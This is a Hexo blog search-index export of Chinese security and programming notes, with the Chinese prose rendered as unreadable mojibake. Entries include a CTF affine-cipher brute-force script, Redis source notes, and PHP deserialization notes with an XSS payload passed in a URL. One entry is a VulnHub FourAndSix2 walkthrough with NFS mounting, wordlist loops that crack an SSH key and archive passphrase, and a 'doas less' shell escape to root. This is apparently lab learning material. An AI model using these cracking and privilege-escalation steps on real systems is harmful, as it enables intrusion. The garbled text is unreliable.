è¿”å›žä¸€ä¸ªæ•´æ•°ï¼Œç»™å‡ºæ–‡ä»¶å¯¹è±¡åœ¨æ–‡ä»¶ä¸­çš„å½“å‰ä½ç½®ï¼Œè¡¨ç¤ºä¸ºäºŒè¿›åˆ¶æ¨¡å¼ä¸‹æ—¶ä»Žæ–‡ä»¶å¼€å§‹çš„å­—èŠ‚æ•°ï¼Œä»¥åŠæ–‡æœ¬æ¨¡å¼ä¸‹çš„ä¸é€æ˜Žæ•°å­—ã€‚]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cybricså¤çŽ°]]></title>
    <url>%2F2019%2F07%2F31%2Fcybrics%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[ç›®å‰å¤ªèœäº†ï¼Œæ²¡åšå‡ºå‡ é“cybricsçš„é¢˜ç›®ï¼Œè¶ç€é¢˜ç›®è¿˜åœ¨å¤çŽ°ä¸€æ³¢ Zakukozh ä¸‹è½½åœ°å€ ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼ŒäºŽæ˜¯æƒ³æŸ¥çœ‹æ–‡ä»¶ç±»åž‹ï¼š zakukozh.bin: data é¢˜ç›®ä¸­æœ‰æç¤ºè¯´æ˜¯affine cipher affine cipherä¸­æ–‡ç¿»è¯‘è¿‡æ¥å°±æ˜¯æ”¾å°„å¯†ç ï¼Œå¯ä»¥ç†è§£æˆç®€å•çš„æ›¿æ¢åŠ å¯†ï¼Œæ¯”å¦‚wikipediaä¸Šä¸¾å‡ºçš„æ —å­ ä¸€ä¸ªå¤§å°ä¸ºmçš„å­—æ¯è¡¨ï¼Œé€šè¿‡å˜æ¢ $E(x) = (ax+b) mod , m$ å¾—åˆ°å¯†æ–‡ æŸ¥çœ‹æ–‡ä»¶çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œå­¦ä¹ ä¸€äº›hexdumpå‘½ä»¤ 1234567891011pxy@LAPTOP-UBIEP4K5 î‚° /mnt/f/1.ctf/cybrics/crypto î‚° hexdump -C zakukozh.bin| head00000000 60 09 eb 82 1c ef df ef 59 59 59 1c a0 91 55 27 |`.......YYY...U&apos;|00000010 59 59 77 bc 59 59 59 2e d1 77 59 59 59 a9 44 38 |YYw.YYY..wYYY.D8|00000020 31 59 59 59 68 16 27 82 37 59 8b 6b fd 00 59 59 |1YYYh.&apos;.7Y.k..YY|00000030 59 95 62 28 dc 28 59 59 b8 ba fe 1d 08 a4 59 59 |Y.b(.(YY......YY|00000040 59 e0 e9 91 90 16 59 59 2b c6 59 59 2b c6 68 02 |Y.....YY+.YY+.h.|00000050 da 31 35 59 59 fe 7e a0 55 28 45 61 db 3c 3d 10 |.15YY.~.U(Ea.&lt;=.|00000060 08 a6 a1 a3 a4 89 ab 3e 68 b0 1b 82 a6 35 fd cd |.......&gt;h....5..|00000070 1c e0 d9 de 59 67 7f e3 45 70 b0 e2 e6 22 55 17 |....Yg..Ep...&quot;U.|00000080 32 d9 de 3e 87 1d d2 c2 59 51 e7 e6 59 49 a2 82 |2..&gt;....YQ..YI..|00000090 68 39 eb ab 77 19 7d fd a4 d9 a1 b0 ef 59 f8 07 |h9..w.&#125;......Y..| æŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®å¦‚ä¸Šï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œè¿™å°±æ˜¯ä»¿å°„åŠ å¯†ä¹‹åŽçš„ç»“æžœï¼Œé‚£ä¹ˆå¦‚ä½•ç¡®å®ša,b,mè¿™ä¸‰ä¸ªå‚æ•° ç”±äºŽæ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œé‚£ä¹ˆmå°±æ˜¯256 aå’Œbå°±é€šè¿‡çˆ†ç ´æ¥è§£å†³ è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112def reffine(a, b, c): return chr((a * (ord(c) - b)) % 256)with open('zakukozh.bin') as f: encrypted = f.read()for i in range(256): for j in range(256): decrypted = ''.join([reffine(i, j, c) for c in encrypted]) with open('output/dec_&#123;&#125;_&#123;&#125;.out'.format(i, j), 'wb') as f: f.write(decrypted) å°±æ˜¯è·‘çš„å¤ªæ…¢äº† ðŸ˜‚]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>cybrics</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisæºç é˜…è¯»â€”â€”dict]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict%2F</url>
    <content type="text"><![CDATA[dictç±»åž‹ å…ˆçœ‹å®å®šä¹‰ æœ€åŸºæœ¬çš„æ˜¯dictç±»åž‹ï¼Œå¦‚ä¸‹ï¼š 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */ int iterators; /* number of iterators currently running */&#125; dict; dictType æ˜¯ä¸€ä¸ªç»“æž„ä½“ï¼ŒåŒ…å«äº†dictçš„ä¸€äº›åŸºç¡€æ–¹æ³• privdata æ˜¯ç§æœ‰æ•°æ® dictht æ˜¯å“ˆå¸Œè¡¨ rehashidx ä»£è¡¨æ˜¯å¦åœ¨è¿›è¡Œé‡å“ˆå¸Œï¼Œå¦‚æžœä¸ä¸º-1åˆ™ä»£è¡¨æ­£åœ¨è¿›è¡Œé‡å“ˆå¸Œ iterators ä»£è¡¨è¿­ä»£å™¨ï¼Œæš‚æ—¶è¿˜ä¸å¤ªç†è§£ æŽ¥ä¸‹æ¥çœ‹å“ˆå¸Œè¡¨çš„ç»“æž„(dictht): 123456typedef struct dictht &#123; dictEntry **table; PORT_ULONG size; PORT_ULONG sizemask; PORT_ULONG used;&#125; dictht; tableæ˜¯ä¸€ä¸ªæŒ‡å‘dictEntryçš„äºŒçº§æŒ‡é’ˆ sizeä»£è¡¨å“ˆå¸Œè¡¨çš„å¤§å° sizemask æ€»æ˜¯ç­‰äºŽsize-1 usedä»£è¡¨è¯¥å“ˆå¸Œè¡¨å·²æœ‰çš„èŠ‚ç‚¹æ•°é‡ è¿™æ˜¯dicthtçš„æž„é€ ï¼š ä¸è¿‡è¿™é‡Œä¸ºä»€ä¹ˆè¦äºŒçº§æŒ‡é’ˆå‘¢ï¼Ÿ å¯ä»¥è¿™æ ·ç†è§£ï¼Œå› ä¸ºdictEntry *æœ¬èº«å°±æ˜¯ä¸€ä¸ªä¸€çº§æŒ‡é’ˆï¼ŒåŒæ—¶tableæŒ‡å‘çš„åˆæ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦äºŒçº§æŒ‡é’ˆäº† å¤ä¹ ä¸€ä¸‹æ•°ç»„æŒ‡é’ˆå’ŒæŒ‡é’ˆæ•°ç»„çš„æ¦‚å¿µ æ•°ç»„æŒ‡é’ˆï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯æŒ‡é’ˆ int (*p)[n] ()è¿ç®—ä¼˜å…ˆçº§æ›´é«˜ï¼Œ*ä¼˜å…ˆä¸Žpç»“åˆï¼Œpè¿˜æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä¸è¿‡pæŒ‡å‘çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™æ—¶å€™p+1è¿ç®—çš„æ­¥é•¿å°±æ˜¯n,æ•…è¿™æ ·çš„æŒ‡é’ˆä¹Ÿå«è¡ŒæŒ‡é’ˆ æŒ‡é’ˆæ•°ç»„ int *p[n] []ä¼˜å…ˆçº§æ›´é«˜ï¼Œpå…ˆä¸Žæ–¹æ‹¬å·ç»“åˆï¼Œè¿™æ—¶å€™pä»£è¡¨çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ•…æ­¤æ—¶på°±æ˜¯äºŒçº§æŒ‡é’ˆ ä¹‹åŽç»§ç»­çœ‹dictEntryç±»åž‹ 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; è¿™é‡Œé¢å­˜å‚¨äº†key-valueé”®å€¼å¯¹ï¼Œå…¶ä¸­keyæ˜¯ä¸€ä¸ªvoid*ç±»åž‹çš„æŒ‡é’ˆï¼Œå¯ä»¥ä»£è¡¨ä»»æ„ç±»åž‹çš„æ•°æ®ï¼Œä½†æ˜¯valueæ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œå¯ä»¥åœ¨æŒ‡é’ˆï¼Œæ•´æ•°å’Œæµ®ç‚¹æ•°ä¸­å–å€¼ nextå±žæ€§æ˜¯æŒ‡å‘å¦ä¸€ä¸ªå“ˆå¸Œè¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œ è¿™ä¸ªæŒ‡é’ˆå¯ä»¥å°†å¤šä¸ªå“ˆå¸Œå€¼ç›¸åŒçš„é”®å€¼å¯¹è¿žæŽ¥åœ¨ä¸€æ¬¡ï¼Œ ä»¥æ­¤æ¥è§£å†³é”®å†²çªï¼ˆcollisionï¼‰çš„é—®é¢˜ å‚è€ƒ å­—å…¸çš„å®žçŽ° Rediså†…éƒ¨æ•°æ®ç»“æž„è¯¦è§£(1)â€”â€”dict æ•°ç»„æŒ‡é’ˆå’ŒæŒ‡é’ˆæ•°ç»„çš„åŒºåˆ«]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>dict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisæºç é˜…è¯»â€”â€”sds]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds%2F</url>
    <content type="text"><![CDATA[ä»Žredisæºç å¼€å§‹ éƒ½è¯´å†™ä»£ç æ˜¯åœ¨è¡¨è¾¾è‡ªå·±ï¼Œé˜…è¯»ä»£ç æ˜¯åœ¨ç†è§£åˆ«äººï¼Œå°¤å…¶æ˜¯é˜…è¯»é«˜è´¨é‡çš„æºä»£ç ï¼ŒäºŽæ˜¯ä¾¿ä»Žå¤´å¼€å§‹è¯»èµ·äº†redisçš„æºç ]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>sds</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¶æœºæ¸—é€]]></title>
    <url>%2F2019%2F07%2F30%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[fourandsix2é¶æœº ä¸€å¼€æœºå°±å¯ä»¥çœ‹åˆ°IPåœ°å€ä½192.168.41.132 ç„¶åŽnmapå¼€å§‹æ‰«æ nmap -A -n -v -Pn -A 192.168.41.132 -A Enable OS detection, version detection, script scanning, and traceroute -n -n/-R: Never do DNS resolution/Always resolve [default: sometimes] -Pn Treat all hosts as online -- skip host discovery æ‰«æçš„æŠ¥å‘Šï¼š 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.41.132Host is up (0.00059s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:| 2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)| 256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)|_ 256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware)Device type: general purposeRunning: OpenBSD 6.XOS CPE: cpe:/o:openbsd:openbsd:6OS details: OpenBSD 6.0 - 6.1Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: RandomizedTRACEROUTEHOP RTT ADDRESS1 0.59 ms 192.168.41.132 éš¾å¾—ä¸€æ¬¡nmapå¯ä»¥æ‰«å‡ºè¿™ä¹ˆå¤šä¿¡æ¯ çœ‹åˆ°é¶æœºå¼€æ”¾äº†2049å·ç«¯å£ï¼Œæ˜¯nfsæœåŠ¡ï¼Œé‚£ä¹ˆå°è¯•æ‰«æå¯ä»¥æŒ‚è½½çš„ç›®å½• -sV : Probe open ports to determine service/version info nmap -sV --script=nfs-showmount 192.168.41.132 æ‰«æå¯ä»¥æŒ‚è½½çš„ç›®å½• ç»“æžœï¼š 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)111/tcp open rpcbind 2 (RPC #100000)| nfs-showmount:|_ /home/user/storage| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware) å¾ˆå¥½ï¼Œé‚£å°±å¯ä»¥æŒ‚è½½ç›®å½•äº† 12root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/nfspy@192.168.41.132:/home/user/storage:/&gt; nfspyshçš„ç”¨æ³•ï¼š 12345678root@kali:~# nfspysh -hUsage: nfspysh [options]Options: -h, --help show this help message and exit -l List mount options available -o OPTIONS Mount options as in nfspy -c COMMAND Semicolon-separated commands to run (batch mode) ç›®å½•ä¸‹æœ‰ä¸€ä¸ªåŽ‹ç¼©åŒ… get backup.7z ç„¶åŽå°è¯•ç”¨7zåŽ»è§£åŽ‹ç¼©ï¼Œä½†æ˜¯æœ‰å¯†ç  äºŽæ˜¯ç”¨johnåŽ»ç ´è§£ ç„¶è€Œçˆ†ç ´æœ‰ç‚¹æ…¢ ä¸è¿‡å¯†ç å°±æ˜¯chocolate ps.kalié‡Œé¢å…¶å®žæœ‰å¾ˆå¤šå­—å…¸çš„ï¼Œæ¯”å¦‚/usr/share/john/password.lst è§£åŽ‹ç¼©ä¹‹åŽå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå…¬é’¥å’Œç§é’¥ é€šè¿‡ä¸‹é¢è¿™æ®µè„šæœ¬çˆ†ç ´å‡ºå¯†ç æ˜¯12345678 12root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done12345678 ç„¶åŽå°±å¯ä»¥ç™»é™†äº† ssh -i id_rsa user@192.168.41.132 ä¹‹å‰ä¸€ç›´å°è¯•æ²¡ç™»é™†æˆåŠŸï¼Œå› ä¸ºæˆ‘å¿˜è®°èµ‹æƒäº† ä¹Ÿå°±æ˜¯ chmod 600 id_rsa ç„¶åŽå°±å¯ä»¥ç™»é™†äº†ï¼š 1234567891011121314root@kali:/tmp# ssh -i id_rsa user@192.168.41.132Enter passphrase for key &apos;id_rsa&apos;:Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code. With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.fourandsix2$ å¦‚ä¸‹æ˜¯é”™è¯¯çš„åšæ³•ï¼š 1234567root@kali:/tmp# ssh -i id_rsa user@192.168.41.132@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0777 for &apos;id_rsa&apos; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored. ç™»é™†ä¹‹åŽ æ²¡åŠžæ³•ç›´æŽ¥è®¿é—®rootæ–‡ä»¶å¤¹ 12fourandsix2$ ls /root/ls: /root/: Permission denied æŽ¥ä¸‹æ¥è¿™æ³¢æ“ä½œå¾ˆä¸æ˜Žç™½ è¾“å…¥ doas /usr/bin/less /var/log/authlog ç„¶åŽæŒ‰vè¿›å…¥ç¼–è¾‘æ¨¡å¼ ä¹‹åŽè¾“å…¥:!/bin/sh äºŽæ˜¯å°±ææƒäº† 12fourandsix2# whoamiroot æˆåŠŸäº† 1234567891011fourandsix2# cat /root/flag.txt Nice you hacked all the passwords!Not all tools worked well. But with some command magic...:cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;donecat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;doneHere is the flag:acd043bc3103ed3dd02eee99d5b0ff42 è¡¥å……ææƒçš„è¿‡ç¨‹ï¼š åœ¨/etc/doas.confæ–‡ä»¶ä¸­æœ‰è¿™äº›å†…å®¹ æ‰€ä»¥å¯ä»¥ç”¨doaså‘½ä»¤æŸ¥çœ‹authlodæ–‡ä»¶ åŒæ—¶ï¼Œé€šè¿‡ç¼–è¾‘å®ƒï¼Œè¿›å…¥äº†shell å‚è€ƒ FourAndSix2.01é¶æœºæ¸—é€]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpååºåˆ—åŒ–ç¬”è®°]]></title>
    <url>%2F2019%2F07%2F30%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[php ååºåˆ—åŒ– å…ˆçœ‹ä¸€ä¸ªæ —å­ï¼š 12345678910&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20";&#125;$test1 = new Test();$object = serialize($test1);print_r($object); åºåˆ—åŒ–ä¹‹åŽå¾—åˆ°çš„ç»“æžœæ˜¯ï¼š O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;} Oä»£è¡¨æ˜¯å¯¹è±¡ï¼ŒTestæ˜¯ç±»åï¼Œä¹‹åŽæ˜¯å±žæ€§ï¼Œä¸åŒç±»åž‹çš„å±žæ€§å…¶å®žåºåˆ—åŒ–ä¹‹åŽå¾—åˆ°çš„ç»“æžœæ˜¯ä¸ä¸€æ ·çš„ã€‚ çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–è¿™ç§æ“ä½œï¼š serialize() è¿”å›žå­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºŽä»»ä½•åœ°æ–¹ã€‚ è¿™æœ‰åˆ©äºŽå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»åž‹å’Œç»“æž„ã€‚ åŒæ—¶æåˆ°äº†ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼š å½“åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° __sleep()ã€‚è¿™æ ·å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œã€‚ç±»ä¼¼çš„ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°ã€‚ __sleep()å’Œ__wakeup()ä¸¤ä¸ªæ–¹æ³•å¾ˆå½¢è±¡åœ°è¯´æ˜Žäº†ä»€ä¹ˆæ—¶å€™è°ƒç”¨ã€‚ ç„¶åŽæˆ‘å°±çŠ¯äº†ä¸€ä¸ªæ–°æ‰‹å¾ˆå¸¸è§çš„é”™è¯¯ï¼š __sleep()æ–¹æ³•å¿…é¡»æ˜¯è¦è¿”å›žä¸€ä¸ªarrayåœ° åŽŸæ¥ã€‚ã€‚__sleep()æ–¹æ³•æ˜¯è¿™æ ·å­è°ƒç”¨çš„å•Š 123456789&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20"; function __sleep()&#123; return array('name', 'sex', 'age'); &#125;&#125; å®žé™…è¿½è¸ªä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå‡ºçŽ°ååºåˆ—åŒ– è°ƒè¯•ä»£ç å¦‚ä¸‹: 12345678910&lt;?phpclass test&#123; public $target = "this is a test"; function __destruct()&#123; echo $this-&gt;target; &#125;&#125;$a = $_GET['b'];$c = unserialize($a); åˆ©ç”¨æ€è·¯ï¼šä¼ å…¥çš„å‚æ•°æ˜¯å¯æŽ§çš„ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªtestç±»å’Œä¸€ä¸ª__destruct()é­”æœ¯æ–¹æ³•ã€‚ é‚£å°±æ˜¯æž„é€ è¿™ä¸ªå¯¹è±¡å°†å…¶åºåˆ—åŒ–ä¹‹åŽä¼ å…¥ï¼Œä¹‹åŽä¼šè‡ªåŠ¨ååºåˆ—åŒ–åŒæ—¶åœ¨å¯¹è±¡é”€æ¯çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æ‰§è¡Œé­”æœ¯æ–¹æ³•äº† æˆ‘ä»¬è¿™æ ·æ¥å†™ï¼š 1234567&lt;?class test&#123; public $target = "&lt;script&gt;alert('xss');&lt;/script&gt;";&#125;$object = new test();print_r(serialize($object)); çªç„¶è§‰å¾—åºåˆ—åŒ–ä¹Ÿæœ‰ä¸€ç‚¹å˜é‡è¦†ç›–çš„å‘³é“ï¼Œæˆ‘åœ¨å¤–éƒ¨æž„é€ çš„ç±»å®žä¾‹åŒ–çš„å¯¹è±¡è¿›å…¥ä»£ç ä¹‹åŽè¦†ç›–äº†åŽŸæ¥çš„å¯¹è±¡ï¼Ÿ è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;} ç„¶åŽå°†å…¶ä½œä¸ºå‚æ•°ä¼ å…¥è¿›åŽ»: http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;} æ­¤æ—¶æŽ¥æ”¶åˆ°äº†å‚æ•°ï¼š $açš„å€¼ä¸ºï¼š&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot; ç»§ç»­å•æ­¥æ­¥å…¥ï¼š è¿™ä¸ªæ—¶å€™å°±ä¼šåŽ»è°ƒç”¨é­”æœ¯æ–¹æ³•äº† xssæ¡†æ¡†å°±å¼¹å‡ºæ¥å•¦ã€‚ æŽ¥ä¸‹æ¥ç»§ç»­ç ”ç©¶å‰©ä¸‹çš„é­”æœ¯æ–¹æ³•ï¼šå…ˆçœ‹å‡ ä¸ªç®€å•çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass test&#123; public $name = 'P2hm1n'; function __construct()&#123; echo "__construct()\n"; &#125; function __destruct()&#123; echo "__destruct()\n"; &#125; function __wakeup()&#123; echo "__wakeup()\n"; &#125; function __toString()&#123; return "__toString()"."\n"; &#125; function __sleep()&#123; echo "__sleep()\n"; return array("name"); &#125; function __call($funName, $argument)&#123; echo "è°ƒç”¨æ–¹æ³•".$funName."(:"."å‚æ•°:"; print_r($argument); echo "ä¸å­˜åœ¨ï¼\n"; &#125; public static function __callStatic($funName, $argument)&#123; echo "è°ƒç”¨é™æ€æ–¹æ³•".$funName."(:"."å‚æ•°:"; print_r($argument); echo "ä¸å­˜åœ¨ï¼\n"; &#125;&#125;$test1 = new test();test::hello("nihao"); //ä¸å®žä¾‹åŒ–å¯¹è±¡ï¼Œæ­¤æ—¶è°ƒç”¨çš„æ˜¯é™æ€æ–¹æ³•$test1-&gt;hello("nihao"); //å®žä¾‹åŒ–å¯¹è±¡$test2 = serialize($test1);$test3 = unserialize($test2);print($test3); è¾“å‡ºçš„ç»“æžœå¦‚ä¸‹ï¼š 123456789101112131415è°ƒç”¨é™æ€æ–¹æ³•hello(:å‚æ•°:Array( [0] =&gt; nihao)ä¸å­˜åœ¨ï¼è°ƒç”¨æ–¹æ³•hello(:å‚æ•°:Array( [0] =&gt; nihao)ä¸å­˜åœ¨ï¼__sleep()__wakeup()__toString()__destruct()__destruct() è¿™å‡ ä¸ªæ–¹æ³•éƒ½è¿˜æŒºå¥½åŒºåˆ†çš„ï¼Œæ¯”è¾ƒéš¾åŒºåˆ†çš„å°±æ˜¯__call()å’Œ__callStatic()æ–¹æ³•äº†ã€‚ TODO åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-manual-note-0]]></title>
    <url>%2F2019%2F07%2F30%2Fphp-manual-note-0%2F</url>
    <content type="text"><![CDATA[php docé˜…è¯»ç¬”è®°0 array æ•°ç»„æ˜¯phpçš„key=&gt;valueæ˜ å°„ keyåªèƒ½æ˜¯integerå’Œstringç±»åž‹ï¼Œvalueå¯ä»¥æ˜¯ä»»æ„ç±»åž‹ æ‰€ä»¥keyä¼šæœ‰å¦‚ä¸‹å¼ºåˆ¶è½¬æ¢ï¼š åŒ…å«æœ‰åˆæ³•æ•´åž‹å€¼çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•´åž‹ã€‚ä¾‹å¦‚é”®å &quot;8&quot; å®žé™…ä¼šè¢«å‚¨å­˜ä¸º 8ã€‚ä½†æ˜¯ &quot;08&quot; åˆ™ä¸ä¼šå¼ºåˆ¶è½¬æ¢ï¼Œå› ä¸ºå…¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„åè¿›åˆ¶æ•°å€¼ã€‚ æµ®ç‚¹æ•°ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºæ•´åž‹ï¼Œæ„å‘³ç€å…¶å°æ•°éƒ¨åˆ†ä¼šè¢«èˆåŽ»ã€‚ä¾‹å¦‚é”®å 8.7 å®žé™…ä¼šè¢«å‚¨å­˜ä¸º 8ã€‚ å¸ƒå°”å€¼ä¹Ÿä¼šè¢«è½¬æ¢æˆæ•´åž‹ã€‚å³é”®å true å®žé™…ä¼šè¢«å‚¨å­˜ä¸º 1 è€Œé”®å false ä¼šè¢«å‚¨å­˜ä¸º 0ã€‚ Null ä¼šè¢«è½¬æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå³é”®å null å®žé™…ä¼šè¢«å‚¨å­˜ä¸º &quot;&quot;ã€‚ æ•°ç»„å’Œå¯¹è±¡ä¸èƒ½è¢«ç”¨ä¸ºé”®åã€‚åšæŒè¿™ä¹ˆåšä¼šå¯¼è‡´è­¦å‘Šï¼šIllegal offset typeã€‚ æ¯”å¦‚å®˜æ–¹ä¸¾ä¾‹å¦‚ä¸‹ï¼š 123456789&lt;?php$array = array( 1 =&gt; "a", "1" =&gt; "b", 1.5 =&gt; "c", true =&gt; "d",);var_dump($array); è¾“å‡ºå¦‚ä¸‹ï¼š 1234array(1) &#123; [1] =&gt; string(1) &quot;d&quot;&#125; ä¼šå¯¼è‡´æ•°ç»„çš„ä¸€éƒ¨åˆ†å€¼è¢«è¦†ç›–æŽ‰ ä¸Šä¾‹ä¸­æ‰€æœ‰çš„é”®åéƒ½è¢«å¼ºåˆ¶è½¬æ¢ä¸º 1ï¼Œåˆ™æ¯ä¸€ä¸ªæ–°å•å…ƒéƒ½ä¼šè¦†ç›–å‰ä¸€ä¸ªçš„å€¼ï¼Œæœ€åŽå‰©ä¸‹çš„åªæœ‰ä¸€ä¸ª &quot;d&quot;ã€‚ åŒæ—¶ï¼š key ä¸ºå¯é€‰é¡¹ã€‚å¦‚æžœæœªæŒ‡å®šï¼ŒPHP å°†è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰ç”¨è¿‡çš„æœ€å¤§ integer é”®ååŠ ä¸Š 1 ä½œä¸ºæ–°çš„é”®åã€‚ 